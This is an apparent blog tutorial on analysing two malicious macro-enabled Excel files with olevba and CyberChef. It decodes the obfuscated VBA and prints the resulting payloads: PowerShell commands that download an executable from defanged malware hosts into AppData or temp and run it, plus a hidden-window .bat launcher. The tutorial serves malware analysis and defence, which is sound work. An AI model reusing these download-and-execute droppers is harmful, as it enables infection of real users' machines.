---
layout: post
title: "Analyzing Macro enabled Office Documents"
image: "/images/msofficemacros/cover.png"
description: "Learn how to analyze MS Office Macro enabled Documents, a step-by-step guide to identifying and reversing malicious macros, and how to use olevba and cyberchef to decode and analyze the macro code. Analyzing Macro enabled Office Documents, a comprehensive guide to malware analysis, reverse engineering, and forensic investigations."
keywords: "Malware-Analysis, Reverse-Engineering, Macro enabled Office Documents, Office Document Analysis, Cyber 5W, Malware Analysis, Reverse Engineering, Gafgyt Backdoor Analysis, JavaScript Deobfuscation Techniques, Hard disk structure and analysis"
tags: [Malware-Analysis, Reverse-Engineering, Macro enabled Office Documents, Office Document Analysis, Cyber 5W, Malware Analysis, Reverse Engineering, Gafgyt Backdoor Analysis, JavaScript Deobfuscation Techniques, Hard disk structure and analysis] 
---
Experience Level required: beginner 

# Objectives

In this blog we will Learn how to analyze MS Office Macro enabled Documents.

{% highlight text %}
1st sample:
    8d15fadf25887c2c974e521914bb7cba762a8f03b1c97a2bc8198e9fb94d45a5
2nd sample:
    a9f8b7b65e972545591683213bb198c1767424423ecc8269833f6e784aa8bc99
{% endhighlight %}

# 1st Sample

Let's see the sample in Virus Total

![](/images/msofficemacros/image2.jpg)

37 of 63 security vendors detected this file as malicious. 

Let's open the file.

![](/images/msofficemacros/image1.jpg)

It uses a social engineering technique to persuade the user to enable the macros that lead to the infection of the user.

Let's see the macro code of the sample, I'll use olevba

{% highlight text %}
olevba "C:\Users\M4lcode\Desktop\xlm sample\8d15fadf25887c2c974e521914bb7cba762a8f03b1c97a2bc8198e9fb94d45a5.xlsm"
{% endhighlight %}
![](/images/msofficemacros/image3.jpg)

It has many suspicious functions, It also has base64 strings

![](/images/msofficemacros/image7.jpg)

Let's dump the macro code to a file to see it better

{% highlight text %}
olevba -c "C:\Users\M4lcode\Desktop\xlm sample\8d15fadf25887c2c974e521914bb7cba762a8f03b1c97a2bc8198e9fb94d45a5.xlsm" > dump.vba
{% endhighlight %}
Let's view the dumped file with notepad ++ (you can view it with any text editor software)

![](/images/msofficemacros/image4.jpg)

This function concatenates two strings, then reverses the result string and assigns it to **Prefix3**.

![](/images/msofficemacros/image5.jpg)

I'll use this python script to reverse the string

{% highlight text %}
def reverse_string(input_string):
    return input_string[::-1]

input_string = "cne- 1 niw- exe.llehsrewop\\0.1v\\llehSrewoPswodniW\\23metsyS\\swodniW\:C"
reversed_string = reverse_string(input_string)
print("Original string:", input_string)
print("Reversed string:", reversed_string)
{% endhighlight %}

![](/images/msofficemacros/image6.jpg)

**Prefix3** =
{% highlight text %}
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win 1 -enc
{% endhighlight %}
Let's go to the next function

The function concatenates 8 base64 encoded strings and assigns it to **Prefix2**.

![](/images/msofficemacros/image8.jpg)

I'll use cyberchef to decode the strings

![](/images/msofficemacros/image9.jpg)

**Prefix2** =
{% highlight text %}
$ProcName = "Ktaqftbffhqhoxzyblssi.exe";
(New-Object System.Net.WebClient).DownloadFile("hxxps[://]www[.]qqqformula[.]co[.]za/works/RICH[.]pif","$env:APPDATA\$ProcName");
Start-Process ("$env:APPDATA\$ProcName")
{% endhighlight %}

Let's go to the next function

![](/images/msofficemacros/image10.jpg)

It concatenates strings

**Prefix1** =
{% highlight text %}
start /MIN
{% endhighlight %}

Let's go to the last function

![](/images/msofficemacros/image11.jpg)

It concatenates **Prefix1**, **Prefix3** and **Prefix2** and print the result in a .bat file named "Bixkcozkkemqyslgmpvwuri.bat" then it runs the file

The resulted .bat file will be:
{% highlight text %}
start /MIN C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  - win 1  - enc $ProcName = "Ktaqftbffhqhoxzyblssi.exe";
(New - Object System.Net.WebClient).DownloadFile("hxxps[://]www[.]qqqformula[.]co[.]za/works/RICH[.]pif", "$env:APPDATA\$ProcName");
Start - Process ("$env:APPDATA\$ProcName")
{% endhighlight %}

This script runs powershell script to download file from "hxxps[://]www[.]qqqformula[.]co[.]za/works/RICH[.]pif" to the current user's AppData directory with name "Ktaqftbffhqhoxzyblssi.exe" and executes it.

# 2nd Sample

32 of 60 security vendors detected this file as malicious.

![](/images/msofficemacros/image12.jpg)

Let's open the sample

![](/images/msofficemacros/image13.jpg)

It also employs a social engineering technique to convince the user to enable macros, which then leads to the user being infected.

Let's see its macro code

{% highlight text %}
olevba C:\Users\M4lcode\Desktop\ee6d2f06ce4476370cb830acb3890dca.xls
{% endhighlight %}

![](/images/msofficemacros/image14.jpg)

It uses **wscript** language and base64 encoding

Let's dump it to file
{% highlight text %}
olevba -c C:\Users\M4lcode\Desktop\ee6d2f06ce4476370cb830acb3890dca.xls > dump.vba
{% endhighlight %}
![](/images/msofficemacros/image15.jpg)

Let's try to decode this strings

![](/images/msofficemacros/image16.jpg)

{% highlight ps1 %}

$fdsfsdf = "fsfdghfddfgh";
(NEw-objEct `N`e`T`.`W`e`B`C`l`i`e`N`T`).DownLoAdfIlE('hxxp[://]suyashcollegeofnursing[.]com/language/Don163/CryptedFile163[.]exe', "$ENv:temp\jfcbvept.exe");
Start "$ENv:temp\jfcbvept.exe";
\$fdsfsdf = "fsfdghfddfgh";

{% endhighlight %}
This powershell script is downloading a file from "hxxp[://]suyashcollegeofnursing[.]com" to **temp** directory with name "jfcbvept.exe" then it starts it

CreateObject("Wscript.Shell") return is assigned to **zKShMevSa**

![](/images/msofficemacros/image17.jpg)

So **zKShMevSa** acts like **Wscript.Shell** and **zKShMevSa**.Run = Wscript.Shell.Run.

It's clear now **Wscript.Shell.Run** executes the powershell script that downloads the malware from "hxxp[://]suyashcollegeofnursing[.]com" to **temp** directory with name "jfcbvept.exe" then it executes it.

This blog is authored by **Mostafa Farghaly(M4lcode)**.
